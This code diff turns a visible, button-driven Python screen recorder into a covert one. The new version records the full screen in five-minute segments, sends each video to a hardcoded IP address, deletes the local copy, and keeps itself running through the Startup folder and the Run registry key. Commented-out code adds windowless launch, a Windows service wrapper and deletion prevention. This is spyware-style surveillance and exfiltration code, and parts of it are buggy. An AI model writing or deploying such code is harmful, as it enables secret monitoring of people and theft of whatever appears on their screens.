@@ -1,163 +1,201 @@
-import datetime    
-import webbrowser
-import interface
-import tkinter      #for Linux you must install tkinter and scrot
+import datetime  
 import socket
-import time
 import os
 import struct
-import win32api
-
-import pyautogui
+import sys
 import cv2
-
 import numpy as np  #pip install numpy
 import cv2 as cv    #pip install opencv-python
 import pyautogui    #pip install PyAutoGUI
-
 from os import walk
+import shutil
+import winreg
+from pywinauto import Application
+from dotenv import dotenv_values
 
-status = ""
 
+global server_ip,user_name
+status = True
+while status:
+    with open('setting.txt', 'r') as file:
+        for line in file:
+            if line.startswith('SERVER_IP'):
+                server_ip = line.split('=')[1].strip()
+            elif line.startswith('USER_NAME'):
+                user_name = line.split('=')[1].strip()
+    if server_ip == '' or user_name == '':
+        status = True
+    else :
+        status = False
+    print(f"SERVER_IP: {server_ip}")
+    print(f"USER_NAME: {user_name}")
+# config = dotenv_values('.env')
+
+# # Access environment variables
+# SERVER_IP = config['SERVER_IP']
+# USER_NAME = config['USER_NAME']
+
+# # Print the values
+# print(f"SERVER_IP: {SERVER_IP}")
+# print(f": {USER_NAME}")
+
+
+# automatically running windows...
+# __script_path = os.path.realpath(__file__)
+# app = Application().start("pythonw.exe " + __script_path)
+# script_start_path = os.path.realpath(__file__)
+# script_start_path = sys.executable
+# subprocess.Popen([script_start_path], creationflags=subprocess.CREATE_NO_WINDOW)
 
 # Find the time for name
+# class MyService(win32serviceutil.ServiceFramework):
+#     _svc_name_ = 'MyService'
+#     _svc_display_name_ = 'My Service'
+
+#     def __init__(self, args):
+#         win32serviceutil.ServiceFramework.__init__(self, args)
+#         self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
+#         socket.setdefaulttimeout(60)
+#         self.is_running = True
+
+#     def SvcStop(self):
+#         self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
+#         win32event.SetEvent(self.hWaitStop)
+#         self.is_running = False
+
+#     def SvcDoRun(self):
+#         servicemanager.LogMsg(servicemanager.EVENTLOG_INFORMATION_TYPE,
+#                               servicemanager.PYS_SERVICE_STARTED,
+#                               (self._svc_name_, ''))
+#         self.main()
+
+#     def main(self):
+#         # Your program's logic goes here
+#         while self.is_running:
+#             # Do something
+#             pass
+
+# if __name__ == '__main__':
+#     if len(sys.argv) == 1:
+#         servicemanager.Initialize()
+#         servicemanager.PrepareToHostSingle(MyService)
+#         servicemanager.StartServiceCtrlDispatcher()
+#     else:
+#         win32serviceutil.HandleCommandLine(MyService)
 def find_time():
     x = datetime.datetime.now()
     date_for_name = (x.strftime("%d") + "-" + x.strftime("%m") + "-" + x.strftime("%Y") + "-" + x.strftime("%H") + "-" +
                      x.strftime("%M") + "-" + x.strftime("%S"))
     return date_for_name
-def get_input():
-    global hostname
-    global username
-    hostname = interface.hostname.get()
-    username = interface.username.get()
-    
-def edit_checks(clicked):
-    if clicked == "mp4":
-        if interface.mp4_format.get() == False:
-            interface.avi_format.set(True)
-        else:
-            interface.avi_format.set(False)
-    elif clicked == "avi":
-        if interface.avi_format.get() == False:
-            interface.mp4_format.set(True)
-        else:
-            interface.mp4_format.set(False)
-
-
-def result_format():
-    if interface.mp4_format.get() == True:
-        return ".mp4"
-    else:
-        return ".avi"
-
-def result_format2():
-    if result_format() == ".mp4":
-        return "MP4V"
-    else:
-        return "XVID"
-
-
-interface.video_format.add_checkbutton(label=".mp4", onvalue=1, offvalue=0, variable=interface.mp4_format,
-                                       command=lambda: edit_checks("mp4"))
-interface.video_format.add_checkbutton(label=".avi", onvalue=1, offvalue=0, variable=interface.avi_format,
-                                       command=lambda: edit_checks("avi"))
-
-# interface.about.add_command(label="Mehmet Mert Altuntas",
-                            # command=lambda: webbrowser.open("https://github.com/mehmet-mert"))
-def is_another_process_running():
-    global singleton_socket
-    singleton_socket = socket.socket()
-    try:
-        singleton_socket.bind(('127.0.0.1', 56231))
-        singleton_socket.listen()
-    except:
-        return True
-    return False
 
 def send(screen, currtime, idletime, filename, username):
     sock = socket.socket()
     sock.settimeout(60)
     try:
-        sock.connect((interface.hostname.get(), 56230))
-        sock.sendall(struct.pack('<QQ64s64sI', 111, 222, filename.encode('utf-8'), interface.username.get().encode('utf-8'), len(screen)))
+        sock.connect(('192.168.118.158', 56230))
+        sock.sendall(struct.pack('<QQ64s64sI', 111, 222, filename.encode('utf-8'), username.encode('utf-8'), len(screen)))
         sock.sendall(screen)
         sock.close()
-        os.remove("Outputs/"+filename)
+        os.remove( directory+filename )
+        print('send file success...')
+        video_record()
     except:
         print("coonect failed")
     
-    # logfp.write('Sent {}\n'.format(time.strftime("%y:%m:%d %H:%M:%S", time.localtime())))
+def video_record():
+    create_time = find_time()
+    create_time_dt = datetime.datetime.strptime(create_time, "%d-%m-%Y-%H-%M-%S")
+    
+    screen_width, screen_height = pyautogui.size()
+    fourcc = cv2.VideoWriter_fourcc(*"XVID")
+    output = cv2.VideoWriter(directory +'aaa'+ " " + find_time() + ".avi", fourcc, 20.0, (screen_width, screen_height))
+    while True:
+        img = pyautogui.screenshot()
+        frame = np.array(img)
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        output.write(frame)
+        # cv2.imshow("Screen Recording", frame)
+        
+        current_time = datetime.datetime.now()
+        difference_minutes = (current_time - create_time_dt).total_seconds() / 60
+        if difference_minutes > 5:
+            break
+    output.release()
+    cv2.destroyAllWindows()
+    into_server(create_time_dt)
 
-# Start button command
-def create_vid():
-    global out
-    screen_size = pyautogui.size()
-    fourcc = cv.VideoWriter_fourcc(*result_format2())
-    out = cv.VideoWriter("Outputs/"+ interface.username.get()+ " " + find_time() + result_format(), fourcc, interface.switch.get(),
-                         (screen_size))
+def add_to_startup():
+    script_path = os.path.realpath(__file__)
+    # script_path = sys.executable
+    script_name = "Monitoring"
+    print(script_path)
+    print('setting automatically...')
+    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    
+    # Copy the script to the Startup folder
+    if not os.path.exists(os.path.join(startup_folder, "main.py")):
+        # Copy the script to the Startup folder
+        shutil.copy2(script_path, startup_folder)
+    else:
+        print("main.py already exists in the startup folder.")
+    # Create a shortcut to the script
+    shortcut_path = os.path.join(startup_folder, f"{script_name}.lnk")
+    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run") as key:
+        winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, shortcut_path)
+        
+def add_login_startup(file_path):
+    # Open the registry key for the current user's startup folder
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
 
-def record():
-    img = pyautogui.screenshot()
-    frame = np.array(img)
-    frame = cv.cvtColor(frame, cv.COLOR_BGR2RGB)
-    out.write(frame)
+    # Set the path to your Python executable file
+    exe_path = os.path.abspath(file_path)
 
+    # Add the executable to the startup folder
+    winreg.SetValueEx(key, "MyProgram", 0, winreg.REG_SZ, exe_path)
 
-def start_record():
-    if status in ("end"):
-        create_vid()
-    status_playing("playing")
+    # Close the registry key
+    winreg.CloseKey(key)
 
-def stop_record():
-    out.release()
-    f = []
-    # time.sleep(60)
-    for (dirpath, dirnames, filenames) in walk("Outputs"):
-        for file in filenames:
-            print (file)
-            imgfp = open("Outputs/"+file, 'rb')
+# def prevent_deletion():
+#     # Get the path of the current script
+#     script_delete_path = sys.argv[0]
+#     # Get the absolute path of the script
+#     abs_path = os.path.abspath(script_delete_path)
+#     # Set the file attributes to read-only
+#     try:
+#         os.chmod(abs_path, 0o444)
+#         print("File set to read-only. Deletion prevented.")
+#     except OSError as e:
+#         print(f"Error: {e}")
+
+# prevent_deletion()     
+def into_server(create_time_dt):
+    files = os.listdir(directory)
+    print(type(create_time_dt))
+    print(create_time_dt)
+    formatted_str = create_time_dt.strftime("%d-%m-%Y-%H-%M-%S")
+    for file in files:
+        print('found directory...')
+        print(formatted_str)
+        _file_found = file.split(' ')
+        print(_file_found[1])
+        if _file_found[1].split('.')[0] == formatted_str :
+            print('record success...')
+            imgfp = open(directory+file, 'rb')
             imgdata = imgfp.read()
             imgfp.close()
-            send(imgdata, find_time(), find_time(), file, interface.username.get())
-            time.sleep(1)
-
-# Report what's happening
-def status_playing(yeter):
-    global status
-    status = yeter
-    if status == "stopped":
-        interface.pause["state"] = "disabled"
-        interface.start["state"] = "normal"
-        interface.canvas.itemconfig(interface.info, text="Paused. Continue Recording with Play")
-    elif status == "playing":
-        interface.pause["state"] = "normal"
-        interface.end["state"] = "normal"
-        interface.start["state"] = "disabled"
-        interface.canvas.itemconfig(interface.info, text="Recording...")
-    elif status == "end":
-        interface.canvas.itemconfig(interface.info, text="Video Saved At Outputs Folder. Let's Create Another One!")
-        interface.pause["state"] = "disabled"
-        interface.end["state"] = "disabled"
-        interface.start["state"] = "normal"
-
-
-interface.start.config(command=lambda: start_record())
-interface.end.config(command=lambda: status_playing("end"))
-interface.pause.config(command=lambda: status_playing("stopped"))
-
-#interface.root.protocol("WM_DELETE_WINDOW", on_closing)
-interface.running = True
-while interface.running:
-    interface.root.update()
-    interface.switch.place(x=400, y=176, anchor=tkinter.CENTER)
-    interface.start.place(x=318, y=230, width=172, height=58)
-    interface.pause.place(x=118, y=230, width=172, height=58)
-    interface.end.place(x=518, y=230, width=172, height=58)
-    interface.root.config(menu=interface.menubar)
-    if status == "playing":
-        record()
-    elif status == "stopped":
+            send(imgdata, find_time(), find_time(), file, 'aaa')
+def create_result_directory():
+    global directory
+    directory = "C:\\Users/Public/Result_Output/"
+    if os.path.exists(directory):
         pass
-    elif status == "end":
-        stop_record()
+    else:
+        os.makedirs(directory)
+
+# while True:
+#     add_to_startup()
+#     # add_login_startup("C:\\path\\to\\your\\program.exe")
+#     create_result_directory()
+#     print('++++++++++++++++++++++')
+#     video_record()
